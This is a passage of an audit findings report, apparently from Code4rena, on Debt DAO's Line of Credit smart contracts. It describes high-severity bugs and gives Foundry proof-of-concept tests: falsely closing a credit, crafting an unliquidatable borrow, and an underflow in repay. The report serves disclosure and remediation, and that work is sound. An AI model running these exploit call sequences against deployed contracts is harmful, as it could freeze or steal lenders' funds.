class=\"mtk12\">supportedToken1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">), </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Lender should have initial mint balance&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_addCredit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supportedToken1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ids</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supportedToken1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">), </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Lender should have initial balance less lent amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">hoax</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">borrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supportedToken1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">), </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Borrower should have initial balance + loan&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The credit hasn&#39;t been repaid.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// hoax(borrower);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// line.depositAndRepay(1 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">hoax</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Closing with a non-existent credit ID.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">close</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">31337</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The debt hasn&#39;t been repaid but the status is REPAID.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">line</span><span class=\"mtk1\">.</span><span class=\"mtk11\">status</span><span class=\"mtk1\">()), </span><span class=\"mtk11\">uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">STATUS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">REPAID</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Lender&#39;s balance is still reduced by the borrow amount.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supportedToken1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">), </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Borrower&#39;s balance still includes the borrowed amount.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supportedToken1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">), </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In the <code>close</code> function of <code>LineOfCredit</code>, consider ensuring that a credit with the user-supplied ID exists, before closing it.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/258\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-05-borrower-can-craft-a-borrow-that-cannot-be-liquidated-even-by-arbiter-\" style=\"position:relative;\"><a href=\"#h-05-borrower-can-craft-a-borrow-that-cannot-be-liquidated-even-by-arbiter-\" aria-label=\"h 05 borrower can craft a borrow that cannot be liquidated even by arbiter  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/421\">[H-05] Borrower can craft a borrow that cannot be liquidated, even by arbiter. </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/421\">Trust</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/281\">bin2chen</a></em></p>\n<p>LineOfCredit manages an array of open credit line identifiers called <code>ids</code>. Many interactions with the Line operate on ids[0], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids[0] before other credit lines. </p>\n<p>The list is managed by several functions:</p>\n<ol>\n<li>CreditListLib.removePosition - deletes parameter id in the ids array</li>\n<li>CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element</li>\n<li>\n<p>_sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:</p>\n<ol>\n<li>target index is not empty</li>\n<li>there is no principal owed for the target index’s credit</li>\n</ol>\n</li>\n</ol>\n<p>The idea I had is that if we could corrupt the ids array so that ids[0] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing. </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">modifier whileBorrowing() {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>It turns out there is a simple sequence of calls which allows borrowing while ids[0] is deleted, and does not re-arrange the new borrow into ids[0]!</p>\n<ol>\n<li>id1 = <code>addCredit()</code> - add a new credit line, a new id is pushed to the end of ids array.</li>\n<li>id2 = <code>addCredit()</code> - called again, ids.length = 2</li>\n<li>close(id1) - calls <code>removePosition()</code> on id1, now ids array is [0x000000000000000000000000, id2 ]</li>\n<li>borrow(id2) - will borrow from id2 and call <code>\\_sortIntoQ</code>. The sorting loop will not find another index other than id2’s existing index (<code>id == bytes32(0)</code> is true).</li>\n</ol>\n<p>From this sequence, we achieve a borrow while ids[0] is 0! Therefore, credits[ids[0]].principal = credits[0].principal = 0, and whileBorrowing() reverts.</p>\n<p>The impact is massive - the following functions are disabled:</p>\n<ul>\n<li><code>SecureLine::liquidate()</code></li>\n<li><code>LineOfCredit::depositAndClose()</code></li>\n<li><code>LineOfCredit::depositAndRepay()</code></li>\n<li><code>LineOfCredit::claimAndRepay()</code></li>\n<li><code>LineOfCredit::claimAndTrade()</code></li>\n</ul>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Borrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Copy the following code into LineOfCredit.t.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _addCreditLender2(address token, uint256 amount) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Prepare lender 2 operations, does same as mintAndApprove()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address lender2 = address(21);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    deal(lender2, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    supportedToken1.mint(lender2, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    supportedToken2.mint(lender2, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    unsupportedToken.mint(lender2, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(lender2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    supportedToken1.approve(address(line), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    supportedToken2.approve(address(line), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    unsupportedToken.approve(address(line), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // addCredit logic</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.prank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    line.addCredit(dRate, fRate, amount, token, lender2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.prank(lender2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    line.addCredit(dRate, fRate, amount, token, lender2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function test_attackUnliquidatable() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes32 id_1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes32 id_2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _addCredit(address(supportedToken1), 1 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _addCreditLender2(address(supportedToken1), 1 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    id_1 =  line.ids(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    id_2 =  line.ids(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    hoax(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    line.close(id_1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    hoax(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    line.borrow(id_2, 1 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    id_1 =  line.ids(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    id_2 = line.ids(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;id1 : &quot;, uint256(id_1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;id2 : &quot;, uint256(id_2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.warp(ttl+1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.expectRevert(ILineOfCredit.NotBorrowing.selector);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool isSolvent = line.declareInsolvent();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When sorting new borrows into the ids queue, do not skip any elements.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/421\">dmvt (judge) marked as nullified</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/421#issuecomment-1341256600\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Unclear why this issue is nullified, I have demonstrated a POC that shows line cannot be declared insolvent.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/421#issuecomment-1343253554\">dmvt (judge) re-opened the issue and commented</a>:</strong></p>\n<blockquote>\n<p>Kicking back to the sponsor for another look. I’m inclined to bring this one back as valid unless the sponsor can show why it isn’t.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/421#issuecomment-1405074802\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-06-repaying-a-line-of-credit-with-a-higher-than-necessary-claimed-revenue-amount-will-force-the-borrower-into-liquidation\" style=\"position:relative;\"><a href=\"#h-06-repaying-a-line-of-credit-with-a-higher-than-necessary-claimed-revenue-amount-will-force-the-borrower-into-liquidation\" aria-label=\"h 06 repaying a line of credit with a higher than necessary claimed revenue amount will force the borrower into liquidation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/461\">[H-06] Repaying a line of credit with a higher than necessary claimed revenue amount will force the borrower into liquidation</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/461\">berndartmueller</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/418\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/414\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/336\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/210\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/93\">aphak5010</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/82\">rvierdiiev</a></em></p>\n<p>A borrower can repay (parts) of a credit line with the <code>SpigotedLine.useAndRepay</code> function. This function will use <code>amount</code> of <code>unusedTokens[credit.token]</code> as a repayment. However, if <code>amount</code> exceeds the principal and the accrued interest, <code>credit.principal</code> will underflow without an error and set the principal value to a very large number.</p>\n<p>This a problem because a borrower can unknowingly provide a larger than necessary <code>amount</code> to the <code>SpigotedLine.useAndRepay</code> function to make sure enough funds are used to fully repay the principal and the remaining interest.</p>\n<p>Additionally, a lender can do the same thing as the lender can call this function.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The <code>credit.principal</code> underflows without an error and will be set to a very large number. This will force a secured line <strong>immediately</strong> into liquidation. Additionally, having a principal value close to <code>2^256 - 1</code> will make it hugely expensive to repay the credit line.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186\">utils/CreditLib.sol#L186</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">repay</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{ </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestAccrued</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestAccrued</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestRepaid</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RepayInterest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interest</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestAccrued</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">principalPayment</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span 